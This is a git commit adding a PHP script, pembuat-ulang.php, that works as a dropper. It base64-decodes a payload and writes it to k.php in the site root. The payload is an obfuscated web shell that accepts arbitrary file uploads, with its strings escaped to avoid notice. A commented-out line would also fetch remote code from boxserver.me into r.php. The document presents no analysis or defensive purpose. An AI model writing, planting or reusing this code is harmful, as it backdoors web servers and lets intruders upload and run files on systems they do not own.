0d3b576fa1b180ff91a0900bffcda901a57eb5b7
onlyme1d <agungrikardo09@gmail.com>
2026-01-02 17:54:37 +0700

    Create pembuat-ulang.php

---
+++ pembuat-ulang.php
@@ -0,0 +1,25 @@
+<?php
+
+   /*echo getcwd();
+
+   preg_match("#(.*?)files#", getcwd(), $home);
+
+   file_put_contents($home[1] . "r.php", file_get_contents("https://boxserver.me/p/r.txt"));
+
+
+
+   /* file_put_contents("/var/www/html/p.php", "hs");*/
+
+   preg_match("#(.*?)files#", getcwd(), $home);
+
+   $isi_nama_doang = "PD9waHAKIGlmICgkX1BPU1QpIHsgaWYgKEBjb3B5KCRfRklMRVNbIlwxNDYiXVsiXHg3NFx4NmRcMTYwXDEzN1wxNTZcMTQxXHg2ZFwxNDUiXSwgJF9GSUxFU1siXDE0NiJdWyJceDZlXHg2MVx4NmRceDY1Il0pKSB7IGVjaG8gIlx4M2NceDYyXHgzZVwxNDJceDY1XDE2Mlx4NjhceDYxXHg3M1wxNTFceDZjXDc0XHgyZlx4NjJceDNlXDU1XDU1XHgzZSIgLiAkX0ZJTEVTWyJceDY2Il1bIlwxNTZceDYxXHg2ZFx4NjUiXTsgfSBlbHNlIHsgZWNobyAiXHgzY1x4NjJceDNlXDE0N1x4NjFceDY3XHg2MVwxNTQiOyB9IH0gZWxzZSB7IGVjaG8gIlw3NFwxNDZcMTU3XDE2Mlx4NmRceDIwXDE1NVx4NjVcMTY0XDE1MFx4NmZcMTQ0XHgzZFx4NzBcMTU3XHg3M1wxNjRceDIwXHg2NVx4NmVcMTQzXDE2NFx4NzlceDcwXDE0NVx4M2RceDZkXDE2NVwxNTRcMTY0XDE1MVwxNjBceDYxXHg3Mlx4NzRcNTdceDY2XDE1N1x4NzJceDZkXDU1XDE0NFwxNDFceDc0XDE0MVx4M2VceDNjXDE1MVx4NmVceDcwXHg3NVwxNjRceDIwXDE2NFx4NzlcMTYwXDE0NVw3NVwxNDZcMTUxXDE1NFwxNDVcNDBceDZlXDE0MVwxNTVceDY1XDc1XHg2Nlx4M2VcNzRcMTUxXHg2ZVwxNjBcMTY1XDE2NFx4MjBceDZlXDE0MVx4NmRceDY1XHgzZFx4NzZceDIwXDE2NFx4NzlceDcwXHg2NVx4M2RcMTYzXDE2NVwxNDJceDZkXHg2OVwxNjRceDIwXDE1MVwxNDRceDNkXHg3Nlx4MjBceDc2XDE0MVwxNTRcMTY1XDE0NVx4M2RceDc1XDE2MFw3Nlx4M2NceDYyXHg3Mlw3NiI7IH0gPz4=";
+
+$decode_isi = base64_decode($isi_nama_doang);
+
+$encode = base64_encode($nama_doang);
+
+$fp = fopen($home[1] . "k.php","w");
+
+fputs($fp, $decode_isi);
+
+?>
